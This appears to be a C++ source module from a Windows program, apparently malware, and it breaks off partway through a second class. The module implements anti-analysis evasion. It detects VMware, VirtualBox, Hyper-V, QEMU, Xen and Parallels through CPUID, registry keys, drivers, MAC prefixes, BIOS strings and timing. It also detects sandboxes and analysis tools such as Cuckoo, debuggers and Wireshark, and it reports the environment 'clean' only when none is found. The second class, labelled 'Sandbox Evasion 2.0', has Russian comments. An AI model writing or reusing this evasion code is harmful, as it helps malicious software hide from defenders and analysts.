#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <algorithm>
#include "../common.h"
#include "../logger/file_logger.h"

// Anti-VM detection techniques
class AntiVMDetector {
private:
    bool is_vm_detected;
    std::string detected_vm;
    
public:
    AntiVMDetector() : is_vm_detected(false) {}
    
    bool CheckEnvironment() {
        // Run multiple checks
        if (CheckCPUID()) return false;
        if (CheckRegistryKeys()) return false;
        if (CheckProcesses()) return false;
        if (CheckDrivers()) return false;
        if (CheckHardware()) return false;
        if (CheckBIOS()) return false;
        if (CheckTiming()) return false;
        if (CheckSystemFiles()) return false;
        
        return true; // Environment is clean
    }
    
    std::string GetDetectedVM() const {
        return detected_vm;
    }
    
private:
    // Check CPUID instruction for hypervisor presence
    bool CheckCPUID() {
        #ifdef _WIN64
        int cpuInfo[4] = {0};
        
        // Check hypervisor bit
        __cpuid(cpuInfo, 1);
        if ((cpuInfo[2] >> 31) & 1) {
            detected_vm = "Hypervisor detected via CPUID";
            is_vm_detected = true;
            return true;
        }
        
        // Check hypervisor vendor
        __cpuid(cpuInfo, 0x40000000);
        if (cpuInfo[0] >= 0x40000000) {
            char hypervisorVendor[13] = {0};
            memcpy(hypervisorVendor + 0, &cpuInfo[1], 4);
            memcpy(hypervisorVendor + 4, &cpuInfo[2], 4);
            memcpy(hypervisorVendor + 8, &cpuInfo[3], 4);
            
            std::string vendor(hypervisorVendor);
            
            if (vendor == "VMwareVMware") {
                detected_vm = "VMware";
                is_vm_detected = true;
                return true;
            }
            else if (vendor == "Microsoft Hv") {
                detected_vm = "Hyper-V";
                is_vm_detected = true;
                return true;
            }
            else if (vendor == "VBoxVBoxVBox") {
                detected_vm = "VirtualBox";
                is_vm_detected = true;
                return true;
            }
            else if (vendor == "KVMKVMKVM") {
                detected_vm = "KVM";
                is_vm_detected = true;
                return true;
            }
            else if (vendor == "XenVMMXenVMM") {
                detected_vm = "Xen";
                is_vm_detected = true;
                return true;
            }
        }
        #endif
        
        return false;
    }
    
    // Check registry keys for VM artifacts
    bool CheckRegistryKeys() {
        struct RegistryCheck {
            HKEY root;
            const char* subkey;
            const char* value;
            const char* vm_name;
        };
        
        std::vector<RegistryCheck> checks = {
            // VMware
            {HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", NULL, "VMware"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier", "VMware"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "0", "VMware"},
            
            // VirtualBox
            {HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\VBOX__", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\FADT\\VBOX__", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\RSDT\\VBOX__", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxService", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxSF", NULL, "VirtualBox"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo", NULL, "VirtualBox"},
            
            // Hyper-V
            {HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Hyper-V", NULL, "Hyper-V"},
            {HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\VirtualMachine", NULL, "Hyper-V"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\vmicheartbeat", NULL, "Hyper-V"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\vmicvss", NULL, "Hyper-V"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\vmicshutdown", NULL, "Hyper-V"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\vmicexchange", NULL, "Hyper-V"},
            
            // Xen
            {HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\Xen", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\FADT\\Xen", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\RSDT\\Xen", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\xenevtchn", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\xennet", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\xennet6", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\xensvc", NULL, "Xen"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\xenvdb", NULL, "Xen"},
            
            // QEMU
            {HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier", "QEMU"},
            {HKEY_LOCAL_MACHINE, "HARDWARE\\Description\\System", "SystemBiosVersion", "QEMU"},
            
            // Parallels
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\prl_eth", NULL, "Parallels"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\prl_fs", NULL, "Parallels"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\prl_mouf", NULL, "Parallels"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\prl_pv32", NULL, "Parallels"},
            {HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\prl_paravirt_32", NULL, "Parallels"}
        };
        
        for (const auto& check : checks) {
            HKEY hKey;
            if (RegOpenKeyExA(check.root, check.subkey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                detected_vm = check.vm_name;
                is_vm_detected = true;
                return true;
            }
            
            // Also check with 32-bit view
            if (RegOpenKeyExA(check.root, check.subkey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                detected_vm = check.vm_name;
                is_vm_detected = true;
                return true;
            }
        }
        
        // Check for specific registry values
        for (const auto& check : checks) {
            if (check.value) {
                HKEY hKey;
                if (RegOpenKeyExA(check.root, check.subkey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                    char buffer[256];
                    DWORD size = sizeof(buffer);
                    if (RegQueryValueExA(hKey, check.value, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                        std::string value(buffer);
                        if (value.find(check.vm_name) != std::string::npos ||
                            value.find("VBOX") != std::string::npos ||
                            value.find("VMWARE") != std::string::npos ||
                            value.find("VIRTUAL") != std::string::npos) {
                            RegCloseKey(hKey);
                            detected_vm = check.vm_name;
                            is_vm_detected = true;
                            return true;
                        }
                    }
                    RegCloseKey(hKey);
                }
            }
        }
        
        return false;
    }
    
    // Check for VM-specific processes
    bool CheckProcesses() {
        std::vector<std::pair<std::wstring, std::string>> vmProcesses = {
            // VMware
            {L"vmwareservice.exe", "VMware"},
            {L"vmwaretray.exe", "VMware"},
            {L"vmwareuser.exe", "VMware"},
            {L"VGAuthService.exe", "VMware"},
            {L"vmacthlp.exe", "VMware"},
            {L"vmtoolsd.exe", "VMware"},
            
            // VirtualBox
            {L"vboxservice.exe", "VirtualBox"},
            {L"vboxtray.exe", "VirtualBox"},
            {L"VBoxTray.exe", "VirtualBox"},
            {L"VBoxService.exe", "VirtualBox"},
            
            // Xen
            {L"xenservice.exe", "Xen"},
            {L"xsvc_depriv.exe", "Xen"},
            
            // QEMU
            {L"qemu-ga.exe", "QEMU"},
            {L"qga.exe", "QEMU"},
            
            // Parallels
            {L"prl_cc.exe", "Parallels"},
            {L"prl_tools.exe", "Parallels"},
            {L"prl_tools_service.exe", "Parallels"},
            
            // Hyper-V
            {L"vmcompute.exe", "Hyper-V"},
            {L"vmms.exe", "Hyper-V"},
            {L"vmwp.exe", "Hyper-V"}
        };
        
        // Create snapshot of running processes
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                
                // Convert to lowercase for comparison
                for (auto& c : processName) c = towlower(c);
                
                for (const auto& vmProcess : vmProcesses) {
                    std::wstring vmProcessLower = vmProcess.first;
                    for (auto& c : vmProcessLower) c = towlower(c);
                    
                    if (processName == vmProcessLower) {
                        CloseHandle(hSnapshot);
                        detected_vm = vmProcess.second;
                        is_vm_detected = true;
                        return true;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    // Check for VM-specific drivers
    bool CheckDrivers() {
        std::vector<std::pair<std::wstring, std::string>> vmDrivers = {
            // VMware
            {L"\\\\.\\HGFS", "VMware"},
            {L"\\\\.\\vmci", "VMware"},
            {L"\\\\.\\VMToolsWinService", "VMware"},
            {L"\\\\.\\vmmemctl", "VMware"},
            
            // VirtualBox
            {L"\\\\.\\VBoxMiniRdrDN", "VirtualBox"},
            {L"\\\\.\\VBoxGuest", "VirtualBox"},
            {L"\\\\.\\pipe\\VBoxMiniRdDN", "VirtualBox"},
            {L"\\\\.\\VBoxTrayIPC", "VirtualBox"},
            {L"\\\\.\\pipe\\VBoxTrayIPC", "VirtualBox"},
            
            // Parallels
            {L"\\\\.\\prl_pv", "Parallels"},
            {L"\\\\.\\prl_tg", "Parallels"},
            {L"\\\\.\\prl_time", "Parallels"}
        };
        
        for (const auto& driver : vmDrivers) {
            HANDLE hFile = CreateFileW(driver.first.c_str(), 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                      NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                CloseHandle(hFile);
                detected_vm = driver.second;
                is_vm_detected = true;
                return true;
            }
        }
        
        return false;
    }
    
    // Check hardware characteristics
    bool CheckHardware() {
        // Check total physical memory (VMs often have specific amounts)
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        DWORDLONG totalMemoryMB = memStatus.ullTotalPhys / (1024 * 1024);
        
        // Common VM memory sizes
        if (totalMemoryMB == 512 || totalMemoryMB == 1024 || totalMemoryMB == 2048 || 
            totalMemoryMB == 4096 || totalMemoryMB == 8192) {
            // Additional check - real systems rarely have exactly these amounts
            if (totalMemoryMB % 256 == 0) {
                // Check processor count
                SYSTEM_INFO sysInfo;
                GetSystemInfo(&sysInfo);
                
                if (sysInfo.dwNumberOfProcessors <= 2) {
                    detected_vm = "Generic VM (suspicious memory/CPU configuration)";
                    is_vm_detected = true;
                    return true;
                }
            }
        }
        
        // Check MAC address prefixes
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD dwBufLen = sizeof(adapterInfo);
        DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
        
        if (dwStatus == ERROR_SUCCESS) {
            PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
            do {
                // VMware MAC prefixes
                if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x05 && pAdapterInfo->Address[2] == 0x69) {
                    detected_vm = "VMware (MAC address)";
                    is_vm_detected = true;
                    return true;
                }
                if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x0C && pAdapterInfo->Address[2] == 0x29) {
                    detected_vm = "VMware (MAC address)";
                    is_vm_detected = true;
                    return true;
                }
                if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x50 && pAdapterInfo->Address[2] == 0x56) {
                    detected_vm = "VMware (MAC address)";
                    is_vm_detected = true;
                    return true;
                }
                
                // VirtualBox MAC prefix
                if (pAdapterInfo->Address[0] == 0x08 && pAdapterInfo->Address[1] == 0x00 && pAdapterInfo->Address[2] == 0x27) {
                    detected_vm = "VirtualBox (MAC address)";
                    is_vm_detected = true;
                    return true;
                }
                
                // Parallels MAC prefix
                if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x1C && pAdapterInfo->Address[2] == 0x42) {
                    detected_vm = "Parallels (MAC address)";
                    is_vm_detected = true;
                    return true;
                }
                
                // Microsoft Hyper-V
                if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x15 && pAdapterInfo->Address[2] == 0x5D) {
                    detected_vm = "Hyper-V (MAC address)";
                    is_vm_detected = true;
                    return true;
                }
                
                pAdapterInfo = pAdapterInfo->Next;
            } while (pAdapterInfo);
        }
        
        return false;
    }
    
    // Check BIOS information
    bool CheckBIOS() {
        // Check BIOS vendor and version
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256];
            DWORD size = sizeof(buffer);
            
            // Check BIOSVendor
            if (RegQueryValueExA(hKey, "BIOSVendor", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                std::string biosVendor(buffer);
                
                if (biosVendor.find("VMware") != std::string::npos) {
                    RegCloseKey(hKey);
                    detected_vm = "VMware (BIOS)";
                    is_vm_detected = true;
                    return true;
                }
                if (biosVendor.find("VirtualBox") != std::string::npos || 
                    biosVendor.find("innotek GmbH") != std::string::npos) {
                    RegCloseKey(hKey);
                    detected_vm = "VirtualBox (BIOS)";
                    is_vm_detected = true;
                    return true;
                }
                if (biosVendor.find("Xen") != std::string::npos) {
                    RegCloseKey(hKey);
                    detected_vm = "Xen (BIOS)";
                    is_vm_detected = true;
                    return true;
                }
                if (biosVendor.find("QEMU") != std::string::npos || 
                    biosVendor.find("Bochs") != std::string::npos) {
                    RegCloseKey(hKey);
                    detected_vm = "QEMU (BIOS)";
                    is_vm_detected = true;
                    return true;
                }
                if (biosVendor.find("Parallels") != std::string::npos) {
                    RegCloseKey(hKey);
                    detected_vm = "Parallels (BIOS)";
                    is_vm_detected = true;
                    return true;
                }
                if (biosVendor.find("Microsoft Corporation") != std::string::npos) {
                    // Additional check for Hyper-V
                    size = sizeof(buffer);
                    if (RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                        std::string productName(buffer);
                        if (productName.find("Virtual") != std::string::npos) {
                            RegCloseKey(hKey);
                            detected_vm = "Hyper-V (BIOS)";
                            is_vm_detected = true;
                            return true;
                        }
                    }
                }
            }
            
            // Check SystemManufacturer
            size = sizeof(buffer);
            if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                std::string manufacturer(buffer);
                
                if (manufacturer.find("VMware") != std::string::npos ||
                    manufacturer.find("VirtualBox") != std::string::npos ||
                    manufacturer.find("Xen") != std::string::npos ||
                    manufacturer.find("QEMU") != std::string::npos ||
                    manufacturer.find("Microsoft Corporation") != std::string::npos ||
                    manufacturer.find("Parallels") != std::string::npos) {
                    RegCloseKey(hKey);
                    detected_vm = manufacturer + " (BIOS Manufacturer)";
                    is_vm_detected = true;
                    return true;
                }
            }
            
            RegCloseKey(hKey);
        }
        
        return false;
    }
    
    // Timing-based detection
    bool CheckTiming() {
        // RDTSC timing check - VMs often have inconsistent timing
        LARGE_INTEGER frequency, start, end;
        QueryPerformanceFrequency(&frequency);
        
        // Perform multiple timing tests
        int anomalies = 0;
        for (int i = 0; i < 10; i++) {
            QueryPerformanceCounter(&start);
            
            // Execute CPUID instruction (serializing instruction)
            int cpuInfo[4];
            __cpuid(cpuInfo, 0);
            
            QueryPerformanceCounter(&end);
            
            // Calculate elapsed time in microseconds
            double elapsed = ((double)(end.QuadPart - start.QuadPart) * 1000000.0) / frequency.QuadPart;
            
            // CPUID should be very fast on real hardware (< 100 microseconds)
            if (elapsed > 500.0) {
                anomalies++;
            }
            
            Sleep(10); // Small delay between tests
        }
        
        // If more than half of the tests show anomalies, likely a VM
        if (anomalies > 5) {
            detected_vm = "VM detected via timing analysis";
            is_vm_detected = true;
            return true;
        }
        
        return false;
    }
    
    // Check for VM-specific system files
    bool CheckSystemFiles() {
        std::vector<std::pair<std::wstring, std::string>> vmFiles = {
            // VMware
            {L"C:\\Windows\\System32\\drivers\\vmmouse.sys", "VMware"},
            {L"C:\\Windows\\System32\\drivers\\vmhgfs.sys", "VMware"},
            {L"C:\\Windows\\System32\\drivers\\vmusbmouse.sys", "VMware"},
            {L"C:\\Windows\\System32\\drivers\\vmkdb.sys", "VMware"},
            {L"C:\\Windows\\System32\\drivers\\vmrawdsk.sys", "VMware"},
            {L"C:\\Windows\\System32\\drivers\\vmmemctl.sys", "VMware"},
            
            // VirtualBox
            {L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "VirtualBox"},
            {L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys", "VirtualBox"},
            {L"C:\\Windows\\System32\\drivers\\VBoxSF.sys", "VirtualBox"},
            {L"C:\\Windows\\System32\\drivers\\VBoxVideo.sys", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxdisp.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxhook.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxmrxnp.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxogl.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxoglarrayspu.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxoglcrutil.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxoglerrorspu.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxoglfeedbackspu.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxoglpackspu.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxoglpassthroughspu.dll", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxservice.exe", "VirtualBox"},
            {L"C:\\Windows\\System32\\vboxtray.exe", "VirtualBox"},
            {L"C:\\Windows\\System32\\VBoxControl.exe", "VirtualBox"},
            
            // Parallels
            {L"C:\\Windows\\System32\\drivers\\prl_eth.sys", "Parallels"},
            {L"C:\\Windows\\System32\\drivers\\prl_fs.sys", "Parallels"},
            {L"C:\\Windows\\System32\\drivers\\prl_mouf.sys", "Parallels"},
            {L"C:\\Windows\\System32\\drivers\\prl_pv32.sys", "Parallels"},
            {L"C:\\Windows\\System32\\drivers\\prl_paravirt_32.sys", "Parallels"}
        };
        
        for (const auto& file : vmFiles) {
            if (GetFileAttributesW(file.first.c_str()) != INVALID_FILE_ATTRIBUTES) {
                detected_vm = file.second;
                is_vm_detected = true;
                return true;
            }
        }
        
        return false;
    }
    
    // Check for sandbox-specific characteristics
    bool CheckSandboxEnvironment() {
        // Check uptime (sandboxes often have very low uptime)
        DWORD uptime = GetTickCount();
        if (uptime < 600000) { // Less than 10 minutes
            detected_vm = "Sandbox (low uptime)";
            is_vm_detected = true;
            return true;
        }
        
        // Check for mouse movement (sandboxes often lack user interaction)
        if (CheckMouseMovement()) {
            detected_vm = "Sandbox (no mouse activity)";
            is_vm_detected = true;
            return true;
        }
        
        // Check for recent files (sandboxes often have clean environments)
        if (CheckRecentFiles()) {
            detected_vm = "Sandbox (no recent files)";
            is_vm_detected = true;
            return true;
        }
        
        // Check for sandbox-specific processes
        if (CheckSandboxProcesses()) {
            return true;
        }
        
        // Check for analysis tools
        if (CheckAnalysisTools()) {
            return true;
        }
        
        // Check sleep patching
        if (CheckSleepPatching()) {
            detected_vm = "Sandbox (sleep patching detected)";
            is_vm_detected = true;
            return true;
        }
        
        // Check DLL injection patterns
        if (CheckDLLInjection()) {
            detected_vm = "Sandbox (DLL injection detected)";
            is_vm_detected = true;
            return true;
        }
        
        return false;
    }
    
    bool CheckMouseMovement() {
        POINT initialPos, currentPos;
        GetCursorPos(&initialPos);
        
        // Wait and check if mouse moved
        Sleep(1000);
        GetCursorPos(&currentPos);
        
        // If mouse didn't move at all, might be sandbox
        return (initialPos.x == currentPos.x && initialPos.y == currentPos.y);
    }
    
    bool CheckRecentFiles() {
        // Check number of files in common directories
        WIN32_FIND_DATAW findData;
        HANDLE hFind;
        int fileCount = 0;
        
        // Check Documents folder
        wchar_t documentsPath[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, documentsPath) == S_OK) {
            std::wstring searchPath = std::wstring(documentsPath) + L"\\*.*";
            hFind = FindFirstFileW(searchPath.c_str(), &findData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        fileCount++;
                    }
                } while (FindNextFileW(hFind, &findData) && fileCount < 5);
                FindClose(hFind);
            }
        }
        
        // If very few files, might be sandbox
        return fileCount < 3;
    }
    
    bool CheckSandboxProcesses() {
        std::vector<std::pair<std::wstring, std::string>> sandboxProcesses = {
            // Cuckoo Sandbox
            {L"agent.py", "Cuckoo"},
            {L"analyzer.py", "Cuckoo"},
            {L"cuckoomon.exe", "Cuckoo"},
            {L"cuckoo.exe", "Cuckoo"},
            {L"python.exe", "Possible Cuckoo"},
            
            // JoeSandbox
            {L"joeboxcontrol.exe", "JoeSandbox"},
            {L"joeboxserver.exe", "JoeSandbox"},
            {L"joe.exe", "JoeSandbox"},
            
            // Anubis
            {L"sample.exe", "Anubis"},
            {L"snxhk.exe", "Anubis"},
            
            // ThreatExpert
            {L"dbghelp.dll", "ThreatExpert"},
            
            // Norman Sandbox
            {L"sample.exe", "Norman"},
            {L"normsandbox.exe", "Norman"},
            
            // GFI Sandbox
            {L"gfi.exe", "GFI"},
            {L"scanner.exe", "GFI"},
            
            // Common analysis tools
            {L"wireshark.exe", "Network Analysis"},
            {L"dumpcap.exe", "Network Analysis"},
            {L"procmon.exe", "Process Monitor"},
            {L"procexp.exe", "Process Explorer"},
            {L"regmon.exe", "Registry Monitor"},
            {L"filemon.exe", "File Monitor"},
            {L"idaq.exe", "IDA Pro"},
            {L"idaq64.exe", "IDA Pro"},
            {L"ollydbg.exe", "OllyDbg"},
            {L"x32dbg.exe", "x32dbg"},
            {L"x64dbg.exe", "x64dbg"},
            {L"windbg.exe", "WinDbg"},
            {L"systracer.exe", "SysTracer"},
            {L"autoruns.exe", "Autoruns"},
            {L"autorunsc.exe", "Autoruns"},
            {L"filemon.exe", "FileMon"},
            {L"regmon.exe", "RegMon"},
            {L"cain.exe", "Cain"},
            {L"abel.exe", "Abel"},
            {L"RootkitRevealer.exe", "RootkitRevealer"},
            {L"VMwareUser.exe", "VMware"},
            {L"VMwareTray.exe", "VMware"}
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                for (auto& c : processName) c = towlower(c);
                
                for (const auto& sandboxProcess : sandboxProcesses) {
                    std::wstring sandboxProcessLower = sandboxProcess.first;
                    for (auto& c : sandboxProcessLower) c = towlower(c);
                    
                    if (processName == sandboxProcessLower) {
                        CloseHandle(hSnapshot);
                        detected_vm = sandboxProcess.second + " sandbox";
                        is_vm_detected = true;
                        return true;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    bool CheckAnalysisTools() {
        // Check for common analysis tool windows
        std::vector<std::pair<std::wstring, std::string>> analysisWindows = {
            {L"OLLYDBG", "OllyDbg"},
            {L"WinDbgFrameClass", "WinDbg"},
            {L"ID", "IDA Pro"},
            {L"Zeta Debugger", "Zeta Debugger"},
            {L"Rock Debugger", "Rock Debugger"},
            {L"SoftICE", "SoftICE"},
            {L"Immunity Debugger", "Immunity Debugger"},
            {L"HexWorkshopMainWndClass", "Hex Workshop"},
            {L"QTWidget", "Qt-based tool"},
            {L"PEiDMainWndClassName", "PEiD"},
            {L"LordPE", "LordPE"},
            {L"ImportREC", "ImportREC"},
            {L"RegmonClass", "RegMon"},
            {L"FilemonClass", "FileMon"},
            {L"ProcessHacker", "Process Hacker"},
            {L"TCPViewClass", "TCPView"},
            {L"Wireshark", "Wireshark"},
            {L"ConsoleWindowClass", "Console Window"}
        };
        
        for (const auto& window : analysisWindows) {
            HWND hwnd = FindWindowW(window.first.c_str(), NULL);
            if (hwnd != NULL) {
                detected_vm = window.second + " analysis tool";
                is_vm_detected = true;
                return true;
            }
            
            // Also check for windows with specific titles
            hwnd = FindWindowW(NULL, window.first.c_str());
            if (hwnd != NULL) {
                detected_vm = window.second + " analysis tool";
                is_vm_detected = true;
                return true;
            }
        }
        
        return false;
    }
    
    bool CheckSleepPatching() {
        // Test if Sleep function is patched (common in sandboxes)
        LARGE_INTEGER start, end, freq;
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&start);
        
        // Sleep for 1 second
        Sleep(1000);
        
        QueryPerformanceCounter(&end);
        
        // Calculate actual time elapsed
        double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        
        // If significantly less than 1 second, Sleep is likely patched
        return elapsed < 0.9; // Less than 900ms for a 1-second sleep
    }
    
    bool CheckDLLInjection() {
        // Check for unexpected DLLs loaded in our process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        MODULEENTRY32W me32;
        me32.dwSize = sizeof(MODULEENTRY32W);
        
        std::vector<std::wstring> suspiciousDLLs = {
            L"cuckoomon.dll",
            L"api_log.dll",
            L"dir_watch.dll",
            L"pstorec.dll",
            L"vmcheck.dll",
            L"wpespy.dll",
            L"apimonitor.dll",
            L"apispy32.dll",
            L"detoured.dll",
            L"madchook.dll",
            L"user_inject.dll",
            L"hook.dll",
            L"logging.dll",
            L"monitor.dll",
            L"analysis.dll"
        };
        
        if (Module32FirstW(hSnapshot, &me32)) {
            do {
                std::wstring moduleName = me32.szModule;
                for (auto& c : moduleName) c = towlower(c);
                
                for (const auto& suspicious : suspiciousDLLs) {
                    std::wstring suspiciousLower = suspicious;
                    for (auto& c : suspiciousLower) c = towlower(c);
                    
                    if (moduleName.find(suspiciousLower) != std::wstring::npos) {
                        CloseHandle(hSnapshot);
                        detected_vm = "Sandbox DLL injection: " + std::string(moduleName.begin(), moduleName.end());
                        is_vm_detected = true;
                        return true;
                    }
                }
            } while (Module32NextW(hSnapshot, &me32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
public:
    // Enhanced environment check including sandbox detection
    bool CheckCompleteEnvironment() {
        // First run standard VM checks
        if (CheckCPUID()) return false;
        if (CheckRegistryKeys()) return false;
        if (CheckProcesses()) return false;
        if (CheckDrivers()) return false;
        if (CheckHardware()) return false;
        if (CheckBIOS()) return false;
        if (CheckTiming()) return false;
        if (CheckSystemFiles()) return false;
        
        // Then run sandbox-specific checks
        if (CheckSandboxEnvironment()) return false;
        
        return true; // Environment is clean
    }
    
private:
};

// ===================================================================
// Advanced Sandbox Evasion 2.0 - Улучшенная система обнаружения sandbox
// ===================================================================

class AdvancedSandboxEvasion {
private:
    bool sandbox_detected;
    std::string detection_reason;
    int confidence_level; // 1-10, где 10 = точно sandbox
    
    // Пороговые значения для обнаружения
    static constexpr DWORD MIN_UPTIME_MS = 1800000;      // 30 минут минимум
    static constexpr DWORD MIN_MOUSE_CLICKS = 50;        // Минимум кликов мыши
    static constexpr DWORD MIN_KEYSTROKES = 100;         // Минимум нажатий клавиш
    static constexpr DWORD MIN_CPU_CORES = 2;            // Минимум ядер процессора
    static constexpr DWORD MIN_MEMORY_MB = 2048;         // Минимум памяти
    static constexpr DWORD MIN_INSTALLED_SOFTWARE = 10;  // Минимум программ
    static constexpr DWORD MIN_FILE_ARTIFACTS = 20;      // Минимум файловых артефактов
    
public:
    AdvancedSandboxEvasion() : sandbox_detected(false), confidence_level(0) {}
    
    // Главный метод комплексной проверки
    bool PerformComprehensiveCheck() {
        LogInfo("Запуск комплексной проверки Sandbox Evasion 2.0...");
        
        int total_score = 0;
        int max_score = 0;
        
        // Проверяем все методы и суммируем результаты
        if (!CheckUserInteraction()) {
            total_score += 2;
            LogWarning("Обнаружена подозрительная активность пользователя");
        }
        max_score += 2;
        
        if (!CheckSystemUptime()) {
            total_score += 2;
            LogWarning("Подозрительно низкое время работы системы");
        }
        max_score += 2;
        
        if (!CheckInstalledSoftware()) {
            total_score += 1;
